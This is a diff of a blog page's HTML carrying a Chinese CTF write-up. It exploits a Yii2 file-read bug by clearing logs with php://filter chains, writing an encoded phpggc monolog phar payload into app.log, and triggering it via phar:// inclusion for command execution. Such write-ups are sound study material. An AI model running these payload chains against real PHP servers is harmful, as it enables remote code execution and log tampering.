@@ -190,8 +190,8 @@
             <p>国赛的一道php://filter的过滤器利用，顺便学习一下laravel8的debug RCE</p>
 <h3 id="本地环境搭建">本地环境搭建</h3>
 <p>mac下composer直接安装yii2</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">composer create-project --prefer-dist yiisoft/yii2-app-basic basic
-</code></pre></div><p>题目给了<code>composer.json</code>和site控制器内容（应该，比较一下生成的yii2的<code>composer.json</code>文件，发现缺少monolog模块</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>composer create-project --prefer-dist yiisoft/yii2-app-basic basic
+</span></span></code></pre></div><p>题目给了<code>composer.json</code>和site控制器内容（应该，比较一下生成的yii2的<code>composer.json</code>文件，发现缺少monolog模块</p>
 <p><img src="https://i.loli.net/2021/05/28/9XdjVUPaI1yTAzJ.png" alt=""></p>
 <p>添加进项目中的<code>composer.json</code>，执行<code>composer update</code>即可安装缺少的日志模块。接着在config目录的<code>web.php</code>文件中设置日志级别（只需要error级别即可，方便后续利用</p>
 <p><img src="https://i.loli.net/2021/05/28/pvkKnBEg3Q2rITs.png" alt=""></p>
@@ -209,28 +209,28 @@
 <p><img src="https://i.loli.net/2021/05/28/JT8wGgB4fnUdSCp.png" alt=""></p>
 <p>找到日志位置 <code>/runtime/logs/app.log</code></p>
 <p>先进行日志清除，这里使用consumed过滤器，用来清除文件内容，具体作用官方并未公开细节。</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">php://filter/read<span style="color:#ff79c6">=</span>consumed/resource<span style="color:#ff79c6">=</span>../runtime/logs/app.log
-</code></pre></div><p>根据<code>Laravel8</code>的RCE还可以用</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">php://filter/write<span style="color:#ff79c6">=</span>convert.iconv.utf-8.utf-16be|convert.quoted-printable-encode|convert.iconv.utf-16be.utf-8|convert.base64-decode/resource<span style="color:#ff79c6">=</span>../runtime/logs/app.log
-</code></pre></div><p>来清除日志，主要利用思路是将文件内容变为非base64字符，然后使用<code>convert.base64-decode</code>过滤器来进行解密，这样就会达到清空目的，具体细节参考</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>php://filter/read<span style="color:#ff79c6">=</span>consumed/resource<span style="color:#ff79c6">=</span>../runtime/logs/app.log
+</span></span></code></pre></div><p>根据<code>Laravel8</code>的RCE还可以用</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>php://filter/write<span style="color:#ff79c6">=</span>convert.iconv.utf-8.utf-16be|convert.quoted-printable-encode|convert.iconv.utf-16be.utf-8|convert.base64-decode/resource<span style="color:#ff79c6">=</span>../runtime/logs/app.log
+</span></span></code></pre></div><p>来清除日志，主要利用思路是将文件内容变为非base64字符，然后使用<code>convert.base64-decode</code>过滤器来进行解密，这样就会达到清空目的，具体细节参考</p>
 <p><a href="https://xz.aliyun.com/t/9030#toc-4">Laravel Debug mode RCE（CVE-2021-3129）分析复现</a></p>
 <p>接着是写入恶意<strong>payload</strong>，通过前面文章的分析复现我们可以知道，写入payload后日志格式为</p>
-<pre><code>[x]payload [x]payload [x]部分payload
+<pre tabindex="0"><code>[x]payload [x]payload [x]部分payload
 </code></pre><p>也就是两部分完整payload和一部分残缺的payload，这里看看我们<strong>yii2</strong>下面的日志格式。</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-xml" data-lang="xml">2021-05-28 01:51:07 [::1][-][qevmoqnh9m29scm5b1c06l0jh5][error][yii\base\ErrorException:2] yii\base\ErrorException: file_get_contents(hshui): Failed to open stream: No such file or directory in /Users/sw0r3d/works/test/yii_test/basic/controllers/SiteController.php:65
-Stack trace:
-#0 [internal function]: yii\base\ErrorHandler-&gt;handleError(2, &#39;file_get_conten...&#39;, &#39;/Users/sw0r3d/w...&#39;, 65)
-#1 /Users/sw0r3d/works/test/yii_test/basic/controllers/SiteController.php(65): file_get_contents(&#39;hshui&#39;)
-#2 [internal function]: app\controllers\SiteController-&gt;actionIndex()
-#3 /Users/sw0r3d/works/test/yii_test/basic/vendor/yiisoft/yii2/base/InlineAction.php(57): call_user_func_array(Array, Array)
-#4 /Users/sw0r3d/works/test/yii_test/basic/vendor/yiisoft/yii2/base/Controller.php(181): yii\base\InlineAction-&gt;runWithParams(Array)
-#5 /Users/sw0r3d/works/test/yii_test/basic/vendor/yiisoft/yii2/base/Module.php(534): yii\base\Controller-&gt;runAction(&#39;&#39;, Array)
-#6 /Users/sw0r3d/works/test/yii_test/basic/vendor/yiisoft/yii2/web/Application.php(104): yii\base\Module-&gt;runAction(&#39;&#39;, Array)
-#7 /Users/sw0r3d/works/test/yii_test/basic/vendor/yiisoft/yii2/base/Application.php(392): yii\web\Application-&gt;handleRequest(Object(yii\web\Request))
-#8 /Users/sw0r3d/works/test/yii_test/basic/web/index.php(12): yii\base\Application-&gt;run()
-#9 {main}
-</code></pre></div><p>可以看到其实只有两部分payload，也就是</p>
-<pre><code>[x]payload [x]部分payload
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-xml" data-lang="xml"><span style="display:flex;"><span>2021-05-28 01:51:07 [::1][-][qevmoqnh9m29scm5b1c06l0jh5][error][yii\base\ErrorException:2] yii\base\ErrorException: file_get_contents(hshui): Failed to open stream: No such file or directory in /Users/sw0r3d/works/test/yii_test/basic/controllers/SiteController.php:65
+</span></span><span style="display:flex;"><span>Stack trace:
+</span></span><span style="display:flex;"><span>#0 [internal function]: yii\base\ErrorHandler-&gt;handleError(2, &#39;file_get_conten...&#39;, &#39;/Users/sw0r3d/w...&#39;, 65)
+</span></span><span style="display:flex;"><span>#1 /Users/sw0r3d/works/test/yii_test/basic/controllers/SiteController.php(65): file_get_contents(&#39;hshui&#39;)
+</span></span><span style="display:flex;"><span>#2 [internal function]: app\controllers\SiteController-&gt;actionIndex()
+</span></span><span style="display:flex;"><span>#3 /Users/sw0r3d/works/test/yii_test/basic/vendor/yiisoft/yii2/base/InlineAction.php(57): call_user_func_array(Array, Array)
+</span></span><span style="display:flex;"><span>#4 /Users/sw0r3d/works/test/yii_test/basic/vendor/yiisoft/yii2/base/Controller.php(181): yii\base\InlineAction-&gt;runWithParams(Array)
+</span></span><span style="display:flex;"><span>#5 /Users/sw0r3d/works/test/yii_test/basic/vendor/yiisoft/yii2/base/Module.php(534): yii\base\Controller-&gt;runAction(&#39;&#39;, Array)
+</span></span><span style="display:flex;"><span>#6 /Users/sw0r3d/works/test/yii_test/basic/vendor/yiisoft/yii2/web/Application.php(104): yii\base\Module-&gt;runAction(&#39;&#39;, Array)
+</span></span><span style="display:flex;"><span>#7 /Users/sw0r3d/works/test/yii_test/basic/vendor/yiisoft/yii2/base/Application.php(392): yii\web\Application-&gt;handleRequest(Object(yii\web\Request))
+</span></span><span style="display:flex;"><span>#8 /Users/sw0r3d/works/test/yii_test/basic/web/index.php(12): yii\base\Application-&gt;run()
+</span></span><span style="display:flex;"><span>#9 {main}
+</span></span></code></pre></div><p>可以看到其实只有两部分payload，也就是</p>
+<pre tabindex="0"><code>[x]payload [x]部分payload
 </code></pre><p>格式会影响我们写入payload，我们先尝试写普通字符，通过原作者提出的<code>convert.iconv.utf-16le.utf-8</code>方法，以及前面清空日志的过程，我们可以将写入payload中使用过滤器的顺序表示为</p>
 <p><strong>convert.quoted-printable-decode</strong> - &gt; <strong>convert.iconv.utf-16le.utf-8</strong> -&gt; <strong>convert.base64-decode</strong></p>
 <p>这其实就是一个日志清除的简化版，不过在<strong>utf-16le.utf-8</strong>过滤器使用的时候是每次对两个字符进行识别，所以在两部分完整payload的时候会清除失败，对于部分payload的情况有50%机率成功。</p>
@@ -239,32 +239,32 @@ Stack trace:
 <p>也就是在字符和字符之间添加了<code>\0</code>，而<code>quote-printable</code>则是转成<code>=</code> +  ASCII码</p>
 <p><img src="https://i.loli.net/2021/05/28/5lEK7VuyZRdxbjO.png" alt="image-20210528112030143"></p>
 <p>参考上面文章的生成符合链字符的脚本</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#ff79c6">import</span> base64
-
-res <span style="color:#ff79c6">=</span> base64<span style="color:#ff79c6">.</span>b64encode(<span style="color:#f1fa8c">&#39;xxxxx&#39;</span>)
-<span style="color:#ff79c6">print</span>(<span style="color:#f1fa8c">&#39;&#39;</span><span style="color:#ff79c6">.</span>join([<span style="color:#f1fa8c">&#34;=&#34;</span> <span style="color:#ff79c6">+</span> <span style="color:#8be9fd;font-style:italic">hex</span>(<span style="color:#8be9fd;font-style:italic">ord</span>(i))[<span style="color:#bd93f9">2</span>:] <span style="color:#ff79c6">+</span> <span style="color:#f1fa8c">&#34;=00&#34;</span> <span style="color:#ff79c6">for</span> i <span style="color:#ff79c6">in</span> res])<span style="color:#ff79c6">.</span>upper())
-<span style="color:#6272a4">#=65=00=48=00=68=00=34=00=65=00=48=00=67=00=3D=00</span>
-</code></pre></div><h4 id="tips">tips</h4>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#ff79c6">import</span> base64
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>res <span style="color:#ff79c6">=</span> base64<span style="color:#ff79c6">.</span>b64encode(<span style="color:#f1fa8c">&#39;xxxxx&#39;</span>)
+</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">print</span>(<span style="color:#f1fa8c">&#39;&#39;</span><span style="color:#ff79c6">.</span>join([<span style="color:#f1fa8c">&#34;=&#34;</span> <span style="color:#ff79c6">+</span> <span style="color:#8be9fd;font-style:italic">hex</span>(<span style="color:#8be9fd;font-style:italic">ord</span>(i))[<span style="color:#bd93f9">2</span>:] <span style="color:#ff79c6">+</span> <span style="color:#f1fa8c">&#34;=00&#34;</span> <span style="color:#ff79c6">for</span> i <span style="color:#ff79c6">in</span> res])<span style="color:#ff79c6">.</span>upper())
+</span></span><span style="display:flex;"><span><span style="color:#6272a4">#=65=00=48=00=68=00=34=00=65=00=48=00=67=00=3D=00</span>
+</span></span></code></pre></div><h4 id="tips">tips</h4>
 <p>下面关于写入payload的两个问题，如果我们直接写入生成的字符</p>
 <p><img src="https://i.loli.net/2021/05/28/iaKdl5eBM8n93p6.png" alt="image-20210528113356324"></p>
 <p><img src="https://i.loli.net/2021/05/28/65iQzAqNUOZc3HK.png" alt="image-20210528114302006"></p>
 <p><code>utf-16le.utf-8</code>报错了，前面说过这个过滤器对于字符转换是两个字符进行识别，所以我们需要在写入payload的后面加上一个任意字符，让payload结果为双数。</p>
 <p>写入<code>payload</code></p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-http" data-lang="http">?file==65=00=48=00=68=00=34=00=65=00=48=00=67=00=3D=00x
-</code></pre></div><p>清除其他字符</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-http" data-lang="http">?file=php://filter/write=convert.quoted-printable-decode|convert.iconv.utf-16le.utf-8|convert.base64-decode/resource=../runtime/logs/app.log
-</code></pre></div><p>成功写入</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-http" data-lang="http"><span style="display:flex;"><span>?file==65=00=48=00=68=00=34=00=65=00=48=00=67=00=3D=00x
+</span></span></code></pre></div><p>清除其他字符</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-http" data-lang="http"><span style="display:flex;"><span>?file=php://filter/write=convert.quoted-printable-decode|convert.iconv.utf-16le.utf-8|convert.base64-decode/resource=../runtime/logs/app.log
+</span></span></code></pre></div><p>成功写入</p>
 <p><img src="https://i.loli.net/2021/05/28/jWtiyCBgD5vrTN3.png" alt=""></p>
 <p>下面就是写入任意<code>payload</code>，用<code>phpggc</code>找一个符合<code>monolog</code>版本的RCE链，生成</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">php -d<span style="color:#f1fa8c">&#39;phar.readonly=0&#39;</span> ./phpggc monolog/rce1 system id --phar phar -o php://output | base64 -w0|python -c <span style="color:#f1fa8c">&#34;import sys;print(&#39;&#39;.join([&#39;=&#39; + hex(ord(i))[2:] + &#39;=00&#39; for i in sys.stdin.read()]).upper())&#34;</span>
-<span style="color:#6272a4">#如果要执行带有空格的命令，需要用引号包含一下，类似system &#39;ls /&#39;</span>
-</code></pre></div><p>用上面脚本生成一下然后写入，本地写入payload后进行干扰字符清除的时候，因为长度问题可能会导致转换出错，转化错误就添加一个字符保证为双数即可。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>php -d<span style="color:#f1fa8c">&#39;phar.readonly=0&#39;</span> ./phpggc monolog/rce1 system id --phar phar -o php://output | base64 -w0|python -c <span style="color:#f1fa8c">&#34;import sys;print(&#39;&#39;.join([&#39;=&#39; + hex(ord(i))[2:] + &#39;=00&#39; for i in sys.stdin.read()]).upper())&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#6272a4">#如果要执行带有空格的命令，需要用引号包含一下，类似system &#39;ls /&#39;</span>
+</span></span></code></pre></div><p>用上面脚本生成一下然后写入，本地写入payload后进行干扰字符清除的时候，因为长度问题可能会导致转换出错，转化错误就添加一个字符保证为双数即可。</p>
 <p>重复上面写入任意字符操作，最后用phar进行文件包含</p>
-<pre><code class="language-url" data-lang="url">?file=phar://../runtime/logs/app.log/test.txt
+<pre tabindex="0"><code class="language-url" data-lang="url">?file=phar://../runtime/logs/app.log/test.txt
 </code></pre><p><img src="https://i.loli.net/2021/05/28/Unckv29FwsQ3YCB.png" alt="image-20210528135430505"></p>
 <h3 id="后续-5-28">后续 5-28</h3>
 <p>由于前面有提到 <code>convert.iconv.utf-16le.utf-8</code> 过滤器是通过每两个字符进行转换，🤔了一下，如果把日志内容经过base64加密一次转成双数的字符，然后再用 <code>utf-16le</code> 来转换成非base64字符，最后再base64解密一次，应该也可以达到清除日志的目的。</p>
-<pre><code class="language-url" data-lang="url">?file=php://filter/write=convert.base64-encode|convert.iconv.utf-16be.utf-8|convert.base64-decode/resource=../runtime/logs/app.log
+<pre tabindex="0"><code class="language-url" data-lang="url">?file=php://filter/write=convert.base64-encode|convert.iconv.utf-16be.utf-8|convert.base64-decode/resource=../runtime/logs/app.log
 </code></pre><p>结合之前的方式就有三种清除日志的方法，对于写日志<code>strips.tags</code>应该也可以进行利用( Dog3的师傅告诉我的。</p>
 <p>最后是对于命令执行，由于触发函数是<code>call_user_func</code>，在php7版本后，<code>assert</code>不能用来进行代码执行了，导致写shell的想法落空，最后也没成功。</p>
 
